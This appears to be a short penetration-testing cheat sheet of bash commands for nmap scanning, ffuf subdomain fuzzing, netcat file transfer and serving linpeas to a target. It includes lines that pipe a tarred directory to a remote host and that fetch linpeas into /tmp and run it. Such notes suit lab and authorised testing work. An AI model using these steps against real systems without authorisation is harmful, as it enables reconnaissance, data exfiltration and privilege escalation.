## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 5000 -oN nmap_output.txt <host>
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w ./SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://<host> -H "Host: FUZZ.<host>" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc <host> 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Download and serve `linpeas`
### Sender:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Receiver
```bash
cd /tmp
wget <host>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
